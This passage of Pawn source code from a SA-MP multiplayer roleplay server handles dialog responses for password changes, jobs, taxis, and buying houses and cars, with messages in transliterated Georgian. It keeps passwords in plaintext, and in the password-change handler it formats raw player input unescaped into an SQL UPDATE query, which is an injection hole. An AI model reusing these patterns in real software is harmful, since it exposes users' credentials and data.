				ShowPlayerDialog(playerid,dChangePassPass,3,"Parolis Shecvla","{"#cWHITE"}Miutitet Tqveni Dzveli Paroli","OK","CLOSE");
			}
			else SendClientMessage(playerid,CGRAY,"Usafrtxoebis Kodi Sheyvanil Iqna Arasworad.");
		}
		case dChangePassPass:
		{
			if(!response) return true;
			if(!strcmp(inputtext,pData[playerid][pPassword],false) && strlen(inputtext))
			{
				ShowPlayerDialog(playerid,dChangePass1,3,"Parolis Shecvla","{"#cWHITE"}Miutitet Tqveni Axali Paroli","OK","CLOSE");
			}
			else SendClientMessage(playerid,CGRAY,"Paroli Sheyvanil Iqna Arasworad.");
		}
		case dChangePass1:
		{
			if(!response) return true;
			if(strlen(inputtext) <6 || strlen(inputtext) > 22)
			{
				SendClientMessage(playerid,CGRAY,"Paroli Unda Sheicavdes 6-Dan 22-Mde Simbolos");
				ShowPlayerDialog(playerid,dChangePass1,3,"Parolis Shecvla","{"#cWHITE"}Miutitet Tqveni Axali Paroli","OK","CLOSE");
			}
			else
			{
				SetPVarString(playerid,"changepass",inputtext);
				ShowPlayerDialog(playerid,dChangePass2,3,"Parolis Shecvla","{"#cWHITE"}Gaimeoret Tqveni Axali Paroli:","OK","CLOSE");
			}
		}
		case dChangePass2:
		{
			new oldpass[25];
			GetPVarString(playerid,"changepass",oldpass,25);
			DeletePVar(playerid,"changepass");
			if(!response) return true;
			if(!strcmp(inputtext,oldpass,false) && strlen(inputtext))
			{
				new query[128];
				format(query,sizeof(query),"UPDATE `members` SET password = '%s' WHERE nickname = '%s'",inputtext,Name2(playerid));
				mysql_empty(mysql, query);
				if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1 (Parolis Shecvla)");
				format(pData[playerid][pPassword],MAX_PLAYER_NAME,"%s",inputtext);
				SendClientMessage(playerid,CGREEN,"Paroli Sheicvala. Gtxovt Dawerot Igi.");
			}
			else SendClientMessage(playerid,CGRAY,"Tqven Mier Sheyvanili Paroli Ar Sheesabameba Realur Parols.");
		}
		case dSelowork:
		{
			if(!response) return true;
			if(GetPVarInt(playerid,"Work") == 0)
			{
				SetPVarInt(playerid,"Work",5);
				SendClientMessage(playerid,CWHITE,"Gilocavt, Midit {"#cRED"}Witel Rgoltan{"#cWHITE"}, Radgan Aigot Mza Qsovili.");
   		        SetPlayerCheckpoint(playerid,-41.0592,-189.0606,928.7820,1.2);
   		        SetPVarInt(playerid,"loadid",10);
   		        SetPVarInt(playerid,"skinrabota",GetPlayerSkin(playerid));
   		        if(pData[playerid][pSex] == 2) SetPlayerSkin(playerid,157); // ЖЕН
				else SetPlayerSkin(playerid,8);
			}
			else if(GetPVarInt(playerid,"Work") == 5)
			{
				SetPVarInt(playerid,"Work",0);
				DeletePVar(playerid,"coalamount");
				DeletePVar(playerid,"loadid");
				RemovePlayerAttachedObject(playerid,2);
				DisablePlayerCheckpoint(playerid);
				format(mes,sizeof(mes),"{"#cGREEN"}Tqven Daimsaxuret {"#cWHITE"}%d${"#cGREEN"}. Kidev Mobrdzandit",pTemp[playerid][pWorkSalary]);
				SendClientMessage(playerid,CGREEN,mes);
				TransferMoney(-1,playerid,pTemp[playerid][pWorkSalary]);
				pTemp[playerid][pWorkSalary] = 0;
				SetPlayerSkin(playerid,GetPVarInt(playerid,"skinrabota"));
			}
		}
		case dCoalwork:
		{
			if(!response) return true;
			if(GetPVarInt(playerid,"Work") == 0)
			{
				SetPVarInt(playerid,"Work",2);
				SendClientMessage(playerid,CWHITE,"Gilocavt, Midit {"#cRED"}Witel Rgoltan");
   		        SetPlayerCheckpoint(playerid,2486.4209,1934.9823,9.8399,1.2);
   		        SetPVarInt(playerid,"loadid",10);
                SetPVarInt(playerid,"skinrabota",GetPlayerSkin(playerid));
				if(pData[playerid][pSex] == 2) SetPlayerSkin(playerid,157); // ЖЕН
				else SetPlayerSkin(playerid,27);
			}
			else if(GetPVarInt(playerid,"Work") == 2)
			{
				SetPVarInt(playerid,"Work",0);
				DeletePVar(playerid,"coalamount");
				DeletePVar(playerid,"loadid");
				RemovePlayerAttachedObject(playerid,2);
				DisablePlayerCheckpoint(playerid);
				format(mes,sizeof(mes),"{"#cGREEN"}Tqven Daimsaxuret {"#cWHITE"}%d${"#cGREEN"}. Kidev Mobrdzandit",pTemp[playerid][pWorkSalary]);
				SendClientMessage(playerid,CGREEN,mes);
				TransferMoney(-1,playerid,pTemp[playerid][pWorkSalary]);
				pTemp[playerid][pWorkSalary] = 0;
				SetPlayerSkin(playerid,GetPVarInt(playerid,"skinrabota"));
			}
		}
		case dWoodwork:
		{
			if(!response) return true;
			if(GetPVarInt(playerid,"Work") == 0)
			{
				SetPVarInt(playerid,"Work",3);
				SendClientMessage(playerid,CWHITE,"Gilocavt, Wadit {"#cRED"}Witel Rgoltan{"#cWHITE"}, Rom Sheaketot Avtomobili.");
				SetPVarInt(playerid,"kida",2);
				SetPlayerCheckpoint(playerid,62.3760,-274.5660,954.9484,2.0);
				SetPVarInt(playerid,"skinrabota",GetPlayerSkin(playerid));
				if(pData[playerid][pSex] == 2) SetPlayerSkin(playerid,157); // ЖЕН
				else SetPlayerSkin(playerid,268);
			}
			else if(GetPVarInt(playerid,"Work") == 3)
			{
				SetPVarInt(playerid,"Work",0);
				DeletePVar(playerid,"woodamount");
				DeletePVar(playerid,"loadid");
				RemovePlayerAttachedObject(playerid,0);
				RemovePlayerAttachedObject(playerid,1);
				DisablePlayerCheckpoint(playerid);
				format(mes,sizeof(mes),"{"#cGREEN"}Tqven Daimsaxuret {"#cWHITE"}%d${"#cGREEN"}. Kidev Mobrdzandit",pTemp[playerid][pWorkSalary]);
				SendClientMessage(playerid,CGREEN,mes);
				TransferMoney(-1,playerid,pTemp[playerid][pWorkSalary]);
				pTemp[playerid][pWorkSalary] = 0;
				SetPlayerSkin(playerid,GetPVarInt(playerid,"skinrabota"));
			}
		}
		case dGunWork:
		{
			if(!response) return true;
			if(GetPVarInt(playerid,"Work") == 0)
			{
				SetPVarInt(playerid,"Work",4);
				SendClientMessage(playerid,CWHITE,"Gilocavt, Midit {"#cRED"}Witeli Rgolit{"#cWHITE"}, Monishnul Adgilas.");
				SetPVarInt(playerid,"kida",2);
				SetPlayerCheckpoint(playerid,2154.7952,-1972.4408,13.6738,2.0);
				SetPVarInt(playerid,"skinrabota",GetPlayerSkin(playerid));
				if(pData[playerid][pSex] == 2) SetPlayerSkin(playerid,157); // ЖЕН
				else SetPlayerSkin(playerid,260);
			}
			else if(GetPVarInt(playerid,"Work") == 4)
			{
				SetPVarInt(playerid,"Work",0);
				DeletePVar(playerid,"gunamount");
				RemovePlayerAttachedObject(playerid,0);
				RemovePlayerAttachedObject(playerid,1);
				format(mes,sizeof(mes),"{"#cGREEN"}Tqven Daimsaxuret {"#cWHITE"}%d${"#cGREEN"}. Kidev Mobrdzandit",pTemp[playerid][pWorkSalary]);
				SendClientMessage(playerid,CGREEN,mes);
				TransferMoney(-1,playerid,pTemp[playerid][pWorkSalary]);
    			pTemp[playerid][pWorkSalary] = 0;
				DeletePVar(playerid,"varioty");
				SetPVarInt(playerid,"kida",0);
				SetPlayerSkin(playerid,GetPVarInt(playerid,"skinrabota"));
				DisablePlayerCheckpoint(playerid);
			}
		}
		case dHire:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0: //Таксист
				{
					pData[playerid][pJob] = 3;
					UpdatePlayerData(playerid,"job",3);
					SendClientMessage(playerid,CGREEN,"Tqven Daiwyet Mushaoba Taqsistad.");
					SendClientMessage(playerid,CGRAY,"Wadit Da Iqiravet Taxis Avtomobili");
				}
				case 1: //Механик
				{
					pData[playerid][pJob] = 4;
					UpdatePlayerData(playerid,"job",4);
					SendClientMessage(playerid,CGREEN,"Tqven Daiwket Mushaoba Meqanikad.");
					SendClientMessage(playerid,CGRAY,"Wadit Da Daiqiravet Meqanikis Avtomobili");
				}
			}
		}
		case dTaxiRent:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
			new vehicleid = GetPlayerVehicleID(playerid);
			SendClientMessage(playerid,CGREEN,"Tqveni Naqiravebi Taxsit Daiwyet Taqsaoba");
			SendClientMessage(playerid,CYELLOW,"/taxi {"#cWHITE"} - Monishnos Mgzavrma Adgili");
			SendClientMessage(playerid,CYELLOW,"/fare {"#cWHITE"} - Mgzavrobis Fasis Dayeneba");
			TransferMoney(playerid,-1,200);
			pTemp[playerid][pTaxiID] = vehicleid;
		}
		case dCreatehouse1:
		{
			if(!response) return true;
			gCreatehouse[playerid][chouseHint] = listitem;
			ShowPlayerDialog(playerid,dCreatehouse2,1,"Sheqmnis Mtavari","Mititebuli Fasi Bina/saxlis (Aris 1 Atasidan 10 Milionamde.)","Shemdegi","Gamortva");
		}
		case dCreatehouse2:
		{
			if(!response) return true;
			new price = strval(inputtext);
			if(!isNumeric(inputtext) || price < 1000 || price > 10000000)
			{
				SendClientMessage(playerid,CRED,"Araswori Fasi");
				ShowPlayerDialog(playerid,dCreatehouse2,1,"Sheqmnis Mtavari","Mititebuli Fasi Bina/saxlis (Aris 1 Atasidan 10 Milionamde.)","Shemdegi","Gamortva");
				return true;
			}
			gCreatehouse[playerid][chousePrice] = price;
			ShowPlayerDialog(playerid,dCreatehouse3,2,"Sheqmnis Mtavari","Ekoonom Class\nSashualo Class\nElitaruli Class\nMinson","Sheqmna","Gamortva");
		}
		case dCreatehouse3:
		{
			if(!response) return true;
			new clas=listitem;
			new Float:x, Float:y, Float:z, Float:r;
			GetPlayerPos(playerid,x,y,z);
			GetPlayerFacingAngle(playerid,r);
			new query[512];
			format(query,sizeof(query),"INSERT INTO `houses` VALUES('','%d','0','%d','%d','0|0|0|0|0','0|0|0|0|0|0|0|0|0','0|0|0|0','0','0','0','0','0','%f','%f','%f','%f','','','','','','','','','','','','')",clas,gCreatehouse[playerid][chousePrice],gCreatehouse[playerid][chouseHint],x,y,z,r);
			mysql_empty(mysql, query);
			gHouseCount += 1;
			//if(mysql_errno()) ShowPlayerDialog(playerid,dMes,0,"Ошибка MySQL","Произошла ошибка mysql","ОК","");
			format(mes,sizeof(mes),"{ffffff}Создан дом. ID: {"#cGREEN"} %d",gHouseCount);
			SendClientMessage(playerid,CGRAY,mes);
			CreateDynamicPickup(1273,1,x,y,z);
			CreateDynamicMapIcon(x,y,z,31,CWHITE);
		}
		case dHints:
		{
			if(!response) return true;
			new hintid = listitem;
			new Float:x, Float:y, Float:z;
			GetPlayerPos(playerid,x,y,z);
			SetPVarFloat(playerid,"oldx",x);
			SetPVarFloat(playerid,"oldy",y);
			SetPVarFloat(playerid,"oldz",z);
			SetPlayerInterior(playerid,gHints[hintid][hintInterior]);
			SetPlayerVirtualWorld(playerid,hintid+500);
			SetPlayerPos(playerid,gHints[hintid][hintX],gHints[hintid][hintY],gHints[hintid][hintZ]);

		}
		case dHouseInfo:
		{
			if(!response) return true;
			new houseid = pTemp[playerid][pSelectedHouseID];
			if(!gHouses[houseid][houseOwner])
			{
				if(pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Gaqvt Saxli.");
				SPFD(playerid,dHouseBuy,0,"Iyidit Saxls","YES","NO","{"#cWHITE"}Namdvilad Gusrt Sheidzinot Es Saxli {"#cGREEN"}$%d?",gHouses[houseid][housePrice]);
			}
			else
			{
				if(pData[playerid][pHouse] != houseid+1 && gHouses[houseid][houseClose]) return GameTextForPlayer(playerid,"~r~closed",2000,1);
				SetPlayerInterior(playerid,gHints[gHouses[houseid][houseHint]][hintInterior]);
				SetPlayerPos(playerid,gHints[gHouses[houseid][houseHint]][hintX],gHints[gHouses[houseid][houseHint]][hintY],gHints[gHouses[houseid][houseHint]][hintZ]);
				SetPlayerFacingAngle(playerid,gHints[gHouses[houseid][houseHint]][hintR]);
				SetPlayerVirtualWorld(playerid,houseid+1);
				SetPVarInt(playerid,"IsInHouse",1);
			}
		}
		case dHouseBuy:
		{
			if(!response) return true;
			new houseid = pTemp[playerid][pSelectedHouseID];
			if(!gHouses[houseid][houseOwner])
			{
				new price = gHouses[houseid][housePrice];
				if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt Arasakmarisi Tanxa Xelze.");
				new query[256];
				format(query,sizeof(query),"UPDATE `houses` SET `ownerid` = '%d', `owner` = '%s' WHERE `id` = '%d'",pData[playerid][pMysqlID],Name2(playerid),gHouses[houseid][houseID]);
				mysql_empty(mysql, query);
				UpdatePlayerData(playerid,"house",gHouses[houseid][houseID]);
				gHouses[houseid][houseOwnerID] = pData[playerid][pMysqlID];
				format(gHouses[houseid][houseOwner],MAX_PLAYER_NAME,"%s",Name2(playerid));
				pData[playerid][pHouse] = gHouses[houseid][houseID];
				SendClientMessage(playerid,CGREEN,"Gilocavt Tqven sheidzinet Saxli.");
				PlayerPlaySound(playerid,1185,0.0,0.0,0.0);
				SetTimerEx("PlayerPlaySoundDelay",6900,false,"ii",playerid,1186);
				TransferMoney(playerid,-1,price);
				DestroyDynamicPickup(gHousePickup[houseid]);
				gHousePickup[houseid] = CreateDynamicPickup(1272,1,gHouses[houseid][houseX],gHouses[houseid][houseY],gHouses[houseid][houseZ]);
				DestroyDynamicMapIcon(gHouseIcon[houseid]);
				gHouseIcon[houseid] = CreateDynamicMapIcon(gHouses[houseid][houseX],gHouses[houseid][houseY],gHouses[houseid][houseZ],32,CWHITE);
				if(pData[playerid][pHouse] != 0 && pData[playerid][pCar] < 610 && pData[playerid][pCar] > 399)
				{
			    	new vid = gVehicles[pData[playerid][pHouse]][vvID];
					if(vid == INVALID_VEHICLE_ID)
					{
					    new vehicleid = CreateVehicle(gTransport[pData[playerid][pCar]-400][trModel],gHouses[pData[playerid][pHouse]-1][houseParkX],gHouses[pData[playerid][pHouse]-1][houseParkY],gHouses[pData[playerid][pHouse]-1][houseParkZ],gHouses[pData[playerid][pHouse]-1][houseParkR],pData[playerid][pColor1],pData[playerid][pColor2],-1);
					    gVehicles[pData[playerid][pHouse]][vvID] = vehicleid;
						SetVehicleHealthEx(vehicleid,1000);
						ToggleLock(vehicleid);
						gVehicles[vehicleid-1][vFuel] = pData[playerid][pFuel];
					}
				}
			}
		}
		case dSellHouse:
		{
			if(!response) return true;
			if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt SAxli");
			new houseid = pData[playerid][pHouse]-1;
			UpdatePlayerData(playerid,"house",0);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma Mysql");
			new query[512];
			format(query,sizeof(query),"UPDATE `houses` SET `ownerid` = '0', `owner` = '', improve = '0|0|0|0|0', gun = '0|0|0|0|0|0|0|0|0', skin = '0|0|0|0',safecode='0', safemoney='0', drugs='0', products='0',inhabit2id = '0',inhabit3id = '0',inhabit4id = '0',inhabit2='',inhabit3='',inhabit4='' WHERE `id` = '%d'",houseid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma Mysql");
			pData[playerid][pHouse] = 0;
			gHouses[houseid][houseOwnerID] = 0;
			strdel(gHouses[houseid][houseOwner],0,24);
			strdel(gHouseHabits[houseid][0],0,24);
			strdel(gHouseHabits[houseid][1],0,24);
			strdel(gHouseHabits[houseid][2],0,24);
			gHouses[houseid][houseHabitID][0] = 0;
			gHouses[houseid][houseHabitID][1] = 0;
			gHouses[houseid][houseHabitID][2] = 0;
			for(new i;i<9;i++)
			{
				if(i < 5)
				{
					gHouses[houseid][houseImprove][i] = 0;
					if(i < 4) gHouses[houseid][houseSkin][i] = 0;
				}
				gHouses[houseid][houseGun][i] = 0;
			}
			gHouses[houseid][houseSafeCode] = 0;
			gHouses[houseid][houseSafeMoney] = 0;
			gHouses[houseid][houseDrugs] = 0;
			gHouses[houseid][houseProducts] = 0;
			TransferMoney(-1,playerid,gHouses[houseid][housePrice]);
			DestroyDynamicPickup(gHousePickup[houseid]);
			gHousePickup[houseid] = CreateDynamicPickup(1273,1,gHouses[houseid][houseX],gHouses[houseid][houseY],gHouses[houseid][houseZ]);
			DestroyDynamicMapIcon(gHouseIcon[houseid]);
			gHouseIcon[houseid] = CreateDynamicMapIcon(gHouses[houseid][houseX],gHouses[houseid][houseY],gHouses[houseid][houseZ],31,CWHITE);
			SendClientMessage(playerid,CGREEN,"Saxli Gaiyida.");
		}
		case dBuyCarSalon:
		{
			if(!response) return true;
			new str[32];
	 	    SetPlayerVirtualWorld(playerid,playerid+1);
	 	    SetPlayerCameraPos(playerid,-1650.689331, 1211.844970, 17.050832);
			SetPlayerCameraLookAt(playerid,-1655.298950, 1212.868530, 15.406539);
	 	    vehplayer[playerid] = CreateVehicle(VehiclesIndent[VehSelectNum[playerid]][MI],-1660.2301,1213.8774,13.3913,223.3013,0,0,-1);
	        SetVehicleVirtualWorld(vehplayer[playerid],playerid+1);
			for(new i = 0; i < 12; i++) TextDrawShowForPlayer(playerid,VehSelect[i]);
			PlayerTextDrawSetString(playerid,VehSelectPl[playerid][0],VehiclesIndent[VehSelectNum[playerid]][Name]);
			format(str,32,"$%d",VehiclesIndent[VehSelectNum[playerid]][Price]);
			PlayerTextDrawSetString(playerid,VehSelectPl[playerid][4],str);
			PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][1],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][TS]/3.0+485.0,5.0);
			PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][2],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][AR]/3.0+485.0,5.0);
			PlayerTextDrawTextSize(playerid,VehSelectPl[playerid][3],75.0/100.0*VehiclesIndent[VehSelectNum[playerid]][HL]/3.0+485.0,5.0);
			for(new i = 0; i < 5; i++) PlayerTextDrawShow(playerid,VehSelectPl[playerid][i]);
			TutStep[playerid]++;
			SelectTextDraw(playerid,0x1E90FFFF);
			SendClientMessage(playerid,CYELLOW,"Gamosartvelad Gamoiyenet: /exitcar");
    		SetPVarInt(playerid, "car22", 3);
		}
		case dBuyCar:
		{
			if(!response) return true;
			if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Saxli.");
			for(new i = 0; i < 12; i++) TextDrawHideForPlayer(playerid,VehSelect[i]);
		    for(new i = 0; i < 5; i++) PlayerTextDrawHide(playerid,VehSelectPl[playerid][i]);
		    CancelSelectTextDraw(playerid);
		    SetCameraBehindPlayer(playerid);
		    SetPlayerVirtualWorld(playerid,0);
		    SetPVarInt(playerid,"car22",0);
			new color1 = GetPVarInt(playerid,"pbuycarC1");
			new color2 = GetPVarInt(playerid,"pbuycarC2");
			new houseid = pData[playerid][pHouse]-1;
			mysql_BuyCar(playerid, VehiclesIndent[VehSelectNum[playerid]][MI], color1, color2, houseid, VehiclesIndent[VehSelectNum[playerid]][Price], VehSelectNum[playerid]);
		}
		case dBuyCarC1:
		{
			if(!response) return true;
			new color;
			switch(listitem)
			{
				case 0: color = 1;
				case 1: color = 0;
				case 2: color = 2;
				case 3: color = 3;
				case 4: color = 6;
				case 5: color = 103;
				case 6: color = 33;
				case 7: color = 126;
				case 8: color = 102;
				case 9: color = 85;
				default: return ShowPlayerDialog(playerid,dBuyCarC1Edit,1,"Airchiet Nomris Feri 1","Miutitet Nomris Feris ID 1:","OK","BACK");
			}
			SetPVarInt(playerid,"pbuycarC1",color);
			ShowPlayerDialog(playerid,dBuyCarC2,2,"Airchiet Nomris Feri 2","1.Tetri\n{505050}2.Shavi\n{"#cLIGHTBLUE"}3.Cisferi\n{"#cRED"}4.Witeli\n{"#cYELLOW"}5.Yviteli\n{"#cBLUE"}6.Lurji\n{"#cGRAY"}7.Nacrisferi\n{"#cPINK"}8.Vardisferi\n{f5f5dc}9.Beji\n{ff00ff}10.Iisferi\n{"#cWHITE"}Sxva...","OK","CLOSE");
		}
		case dBuyCarC1Edit:
		{
			if(!response) return ShowPlayerDialog(playerid,dBuyCarC1,2,"Airchiet Nomris Feri 1","1.Tetri\n{505050}2.Shavi\n{"#cLIGHTBLUE"}3.Cisferi\n{"#cRED"}4.Witeli\n{"#cYELLOW"}5.Yviteli\n{"#cBLUE"}6.Lurji\n{"#cGRAY"}7.Nacrisferi\n{"#cPINK"}8.Vardisferi\n{f5f5dc}9.Beji\n{ff00ff}10.Iisferi\n{"#cWHITE"}Sxva...","OK","CLOSE");
			if(!strval(inputtext) || !isNumeric(inputtext))
			{
				SendClientMessage(playerid,CGRAY,"Tqven Unda Miutitot Feris ID Avtomobilistvis");
				return ShowPlayerDialog(playerid,dBuyCarC1Edit,1,"Airchiet Nomris Feri 1","Miutitet ID Nomris Feri 1:","OK","BACK");
			}
			SetPVarInt(playerid,"pbuycarC1",strval(inputtext));
			ShowPlayerDialog(playerid,dBuyCarC2,2,"Airchiet Nomris Feri 2","1.Tetri\n{505050}2.Shavi\n{"#cLIGHTBLUE"}3.Cisferi\n{"#cRED"}4.Witeli\n{"#cYELLOW"}5.Yviteli\n{"#cBLUE"}6. Lurji\n{"#cGRAY"}7.Nacrisferi\n{"#cPINK"}8. Vardisferi\n{f5f5dc}9.Beji\n{ff00ff}10.Iisferi\n{"#cWHITE"}Sxva...","OK","BACK");
		}
		case dBuyCarC2:
		{
			if(!response) ShowPlayerDialog(playerid,dBuyCarC1,2,"Airchiet Nomris Feri 1","1.Tetri\n{505050}2.Shavi\n{"#cLIGHTBLUE"}3.Cisferi\n{"#cRED"}4.Witeli\n{"#cYELLOW"}5.Yviteli\n{"#cBLUE"}6. Lurji\n{"#cGRAY"}7.Nacrisferi\n{"#cPINK"}8. Vardisferi\n{f5f5dc}9.Beji\n{ff00ff}10.Iisferi\n{"#cWHITE"}Sxva...","OK","EXIT");
			new color;
			switch(listitem)
			{
				case 0: color = 1;
				case 1: color = 0;
				case 2: color = 2;
				case 3: color = 3;
				case 4: color = 6;
				case 5: color = 103;
				case 6: color = 33;
				case 7: color = 126;
				case 8: color = 102;
				case 9: color = 85;
				default: return ShowPlayerDialog(playerid,dBuyCarC2Edit,1,"Airchiet Nomris Feri 2","Miutitet Nomris Feris ID 2:","OK","BACK");
			}
			SetPVarInt(playerid,"pbuycarC2",color);
			ShowPlayerDialog(playerid,dBuyCar,0,"Avtomobilis Yidva","Namdvilad Gsurt Sheidzinot Es Avtomobili?","YES","NO");
		}
		case dBuyCarC2Edit:
		{
			if(!response) return ShowPlayerDialog(playerid,dBuyCarC2,2,"Airchiet Nomris Feri 2","1.Tetri\n{505050}2.Shavi\n{"#cLIGHTBLUE"}3.Cisferi\n{"#cRED"}4.Witeli\n{"#cYELLOW"}5.Yviteli\n{"#cBLUE"}6. Lurji\n{"#cGRAY"}7.Nacrisferi\n{"#cPINK"}8.Vardisferi\n{f5f5dc}9.Beji\n{ff00ff}10.Iisferi\n{"#cWHITE"}Sxva...","OK","BACK");
			if(!strval(inputtext) || !isNumeric(inputtext))
			{
				SendClientMessage(playerid,CGRAY,"Tqven Unda Miutitot Feris ID Avtomobilistvis");
				return ShowPlayerDialog(playerid,dBuyCarC2Edit,1,"Airchiet Nomris Feri 2","Miutitet ID Nomris Feri 2:","OK","BACK");
			}
			SetPVarInt(playerid,"pbuycarC2",strval(inputtext));
			ShowPlayerDialog(playerid,dBuyCar,0,"Avtomobilis Yidva","Namdvilad Gsurt Sheidzinot Es Avtomobili?","YES","NO");
		}
		case dSellCar:
		{
			if(!response) return true;
			if(!pData[playerid][pCar] || (!pData[playerid][pHouse])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gyavt Avtomobili");
			UpdatePlayerData(playerid,"car",0);
			UpdatePlayerData(playerid,"limit",0);
			pData[playerid][pCar] = 0;
			pData[playerid][pLimit] = 0;
			DestroyVehicle(gVehicles[pData[playerid][pHouse]][vvID]);
			gVehicles[pData[playerid][pHouse]][vvID] = 0;
			TransferMoney(-1,playerid,VehiclesIndent[pData[playerid][pCarID]][Price]/2);
			SendClientMessage(playerid,CGREEN,"Avtomobili Gaiyida");
		}
		case dHouseMenu:
		{
			if(!response) return true;
			new houseid = pData[playerid][pHouse] - 1;
			switch(listitem)
			{
				case 0://Открыть - закрыть
				{
					if(!gHouses[houseid][houseClose])
					{
						gHouses[houseid][houseClose] = 1;
						GameTextForPlayer(playerid,"~r~closed",2000,3);
					}
					else
					{
						gHouses[houseid][houseClose] = 0;
						GameTextForPlayer(playerid,"~g~opened",2000,3);
					}
					new query[256];
					format(query,sizeof(query),"UPDATE `houses` SET `close` = '%d' WHERE `id` = '%d'",gHouses[houseid][houseClose],houseid+1);
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL (Daketva / Gageba Saxlis)");
				}
				case 1: //Статистика
				{
					new classname[20],mes2[256];
					switch(gHouses[houseid][houseClass])
					{
						case 0:classname = "Ekonomi";
						case 1:classname = "Sashualo";
						case 2:classname = "Elituri";
						case 3:classname = "Agaraki";
						default: classname = "Ucnobia";
					}
					new cnt;
					for(new i;i<3;i++)
					{
						if(gHouses[houseid][houseHabitID][i]) cnt++;
					}
					new carname[24];
					if(!pData[playerid][pCar]) strcat(carname,"Ara");
					else strcat(carname,gTransport[pData[playerid][pCar]-400][trName]);
					new status[24];
					if(gHouses[houseid][houseClose]) strcat(status,"{"#cRED"}Daketva");
					else strcat(status,"{"#cGREEN"}Gageba");
					new improve[32];
					if(gHouses[houseid][houseImprove][0]) strcat(improve,"1) Avtomaturi Karebi\n");
					if(gHouses[houseid][houseImprove][1]) strcat(improve,"2) Karada\n");
					format(mes2,sizeof(mes2),"{"#cWHITE"}Saxlis Nomeri: %d\nKlasi: %s\nMcxovrebta Raodenoba: %d/%d\nSaxlis Transporti: %s\nGadaxdili Dgeebis Raodenoba: %d/6\nMdgomareoba: %s\n{"#cWHITE"}Stumrobis Fasi: %d\nGaumjobeseba:\n\n{"#cINFO"}%s",houseid+1,classname,cnt,gHouses[houseid][houseClass],carname,gHouses[houseid][houseDay],status,gHouses[houseid][housePrice],improve);
					ShowPlayerDialog(playerid,dHouseStat,0,"Управление домом",mes2,"OK","");

				}
				case 2: //Улучшения
				{
					for(new i;i<2;i++)
					{
						new c[7];
						if(gHouses[houseid][houseImprove][i]) c = ""#cGREEN"";
						else if(!i || gHouses[houseid][houseImprove][i-1]) c = ""#cWHITE"";
						else c = ""#cGRAY"";
						if(!i) format(mes,sizeof(mes),"{%s}%d. %s",c,i+1,gHouseImproveName[i]);
						else format(mes,sizeof(mes),"%s\n{%s}%d. %s",mes,c,i+1,gHouseImproveName[i]);
					}
					ShowPlayerDialog(playerid,dHouseImprove,2,"Saxlis Martva",mes,"Yidva","Daxurva");
				}
				case 3: OnPlayerCommandText(playerid,"/sellcar");
				case 4: OnPlayerCommandText(playerid,"/sellhouse");
				case 5:
				{
				    new i = pData[playerid][pHouse];
					if(GetPlayerVirtualWorld(playerid) != i) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Sakutar Saxlshi.");
	        	    SetPlayerPos(playerid, 1380.5771,-13.3953,1000.9246);
					SetPlayerFacingAngle(playerid, 268.3237);
					SetPlayerInterior(playerid, 18);
					SetPlayerVirtualWorld(playerid, playerid);
					TogglePlayerControllable(playerid,0);
					SetTimerEx("Unfreez",2000,false,"i",playerid);
				}
			}
		}
		case dHouseStat: OnPlayerCommandText(playerid,"/home");
		case dHouseImprove:
		{
			if(!response) return OnPlayerCommandText(playerid,"/home");
			new houseid = pData[playerid][pHouse] - 1;
			if(gHouses[houseid][houseImprove][listitem])
			{
				SendClientMessage(playerid,CGREEN,"Tqven Ukve gaqvt es Gaumjobeseba.");
				OnPlayerCommandText(playerid,"/home");
			}
			else if((!listitem && !gHouses[houseid][houseImprove][listitem]) || (gHouses[houseid][houseImprove][listitem-1] && !gHouses[houseid][houseImprove][listitem]))
			{
				format(mes, sizeof(mes),"{"#cWHITE"}Gsurt Sheidzinot Gaumjobesebebi: {"#cINFO"}\"%s\"?\n{"#cWHITE"}Es Dagijdebat: {"#cRED"}$%d",gHouseImproveName[listitem],gHouseImprovePrice[listitem]);
				ShowPlayerDialog(playerid,dHouseImprove2,0,"Saxlis Martva",mes,"YES","NO");
				SetPVarInt(playerid,"improveid",listitem);
			}
			else
			{
				SendClientMessage(playerid,CGRAY,"Es Gaumjobeseba, Jer Kidev Ar Aris Xelmisawvdomi");
				OnPlayerCommandText(playerid,"/home");
			}
		}
		case dHouseImprove2:
		{
			new improveid = GetPVarInt(playerid,"improveid");
			DeletePVar(playerid,"improveid");
			if(!response) return OnPlayerCommandText(playerid,"/home");
			new price = gHouseImprovePrice[improveid];
			if(GetPlayerMoneyEx(playerid) < price)
			{
				OnPlayerCommandText(playerid,"/home");
				return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
			}
			new houseid = pData[playerid][pHouse] - 1;
			gHouses[houseid][houseImprove][improveid] = 1;
			new hintid = gHouses[houseid][houseHint];
			switch(improveid)
			{
				case 1:
				{
					CreateDynamicObject(2708,gHintStore[hintid][0],gHintStore[hintid][1],gHintStore[hintid][2],gHintStore[hintid][3],gHintStore[hintid][4],gHintStore[hintid][5],houseid+1);
					gHouses[houseid][houseSkin][0] = pData[playerid][pSkin];
					if(pData[playerid][pFraction]) gHouses[houseid][houseSkin][3] = pData[playerid][pFractionSkin];
					UpdateHouseDress(houseid);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma Mysql (Karadashi Tansacmlis Damaxsovrebisas)");
				}
			}

			new data[32],query[128];
			for(new i;i<5;i++)
			{
				if(!i) format(data,sizeof(data),"%d",gHouses[houseid][houseImprove][i]);
				else format(data,sizeof(data),"%s|%d",data,gHouses[houseid][houseImprove][i]);
			}
